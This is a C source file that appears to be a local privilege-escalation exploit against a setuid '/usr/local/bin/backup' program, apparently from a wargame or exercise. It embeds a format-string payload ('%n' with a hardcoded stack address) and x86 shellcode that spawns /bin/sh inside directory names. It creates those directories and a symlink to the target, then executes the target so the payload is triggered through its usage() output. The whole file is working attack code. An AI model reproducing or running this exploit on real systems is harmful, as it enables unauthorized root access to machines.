#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#define TARGET "/usr/local/bin/backup"
#define MKDIR "/bin/mkdir"
#define MYFILE "./file"
#define LN "/bin/ln"
#define MV "/bin/mv"

#define DIRNAME "\x78\xde\xbf\xff%16u%n\,\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff"
#define LNFILE "\x78\xde\xbf\xff%16u%n\,\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh/file"

static char retaddr[] = "\x78\xde\xbf\xff";

int main(int argc, char * argv[]){
    char *args[3];
    char *env[1];

    env[0] = NULL;

/* create directory */
	/* /share/DIRNAME */
    system("/bin/mkdir \x78\xde\xbf\xff%16u%n\,\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff");

	/* /share/DIRNAME/bin */
    system("/bin/mkdir \x78\xde\xbf\xff%16u%n\,\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin");

	/* /share/DIRNAME/bin/sh */
    system("/bin/mkdir \x78\xde\xbf\xff%16u%n\,\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh");


/* link backup with our new directory */
    system("/bin/ln -s /usr/local/bin/backup \x78\xde\xbf\xff%16u%n\,\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh/file");

 
/* call backup, intended to supply bad arguments
   since we want to call usage() */
    args[0] = LNFILE; args[1] = "backup";
    args[2] = NULL;

    execve(LNFILE, args, env);

    return 0;
}
